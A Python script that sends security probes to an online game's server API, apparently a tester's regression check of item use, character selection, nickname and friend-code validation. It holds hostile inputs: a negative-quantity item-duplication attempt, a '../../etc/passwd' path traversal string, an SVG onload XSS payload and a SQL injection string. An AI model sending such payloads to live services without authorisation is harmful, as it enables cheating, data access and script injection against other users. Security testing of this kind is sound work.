#!/usr/bin/env python3
"""Final security probes: useItem negative qty (item dup), selectChar ACL, nickname XSS, friend validation."""
import json
from bakwan_session import Game

def call(g, name, fn, *args):
    try:
        r = g.call(fn, *args)
        s = json.dumps(r, ensure_ascii=False, default=str)
        print(f"[{name}] {fn}{list(args)} OK -> {s[:240]}")
        return r
    except Exception as e:
        print(f"[{name}] {fn}{list(args)} ERR -> {str(e).split(chr(10))[0][:140]}")
        return None

def main():
    g = Game()
    try:
        p0 = g.player()
        orig_nick = p0["name"]
        print(f"START nick={orig_nick} bakwan={p0['bakwan']} items={p0.get('items')}")

        # 1. useItem negative qty (item duplication attempt; we own 0 items)
        call(g, "u_neg", "useItem", "xpS", "botak", -5)
        call(g, "u_zero", "useItem", "xpS", "botak", 0)
        call(g, "u_nofund", "useItem", "xpS", "botak", 1)
        call(g, "u_negbig", "useItem", "xpL", "arethakirana", -99)
        p1 = g.player()
        print(f"  after useItem probes: items={p1.get('items')} bakwan={p1['bakwan']}")

        # 2. selectChar ACL (unowned legendary Karis id = beaconcream)
        call(g, "sel_karis", "selectChar", "beaconcream")
        call(g, "sel_junk", "selectChar", "../../etc/passwd")
        r = call(g, "sel_restore", "selectChar", "arethakirana")

        # 3. nickname validation + XSS payload (restore afterwards!)
        call(g, "nick_xss", "setNick", "<svg onload=alert(1)>")
        pn = g.player()
        print(f"  nick now: {pn['name']!r}")
        if pn["name"] != orig_nick:
            call(g, "nick_restore", "setNick", orig_nick)
            print(f"  nick restored: {g.player()['name']!r}")
        call(g, "nick_long", "setNick", "A" * 40)
        pn = g.player()
        if pn["name"] != orig_nick:
            call(g, "nick_restore2", "setNick", orig_nick)
        call(g, "nick_short", "setNick", "ab")
        pn = g.player()
        if pn["name"] != orig_nick:
            call(g, "nick_restore3", "setNick", orig_nick)
        call(g, "nick_empty", "setNick", "")
        pn = g.player()
        print(f"  nick after empty: {pn['name']!r}")
        if pn["name"] != orig_nick:
            call(g, "nick_restore4", "setNick", orig_nick)
            print(f"  nick restored: {g.player()['name']!r}")

        # 4. friend code validation (regression on new server)
        call(g, "fr_self", "friendAdd", "9VQ9F7")
        call(g, "fr_junk", "friendAdd", "ZZZZZZ")
        call(g, "fr_inject", "friendAdd", "9VQ9F7' OR 1=1--")

        # 5. challenge edge: challenge yourself
        call(g, "ch_self", "challenge", "9VQ9F7", "arethakirana")
    finally:
        p = g.player()
        print(f"END nick={p['name']} bakwan={p['bakwan']}")
        g.close()

if __name__ == "__main__":
    main()
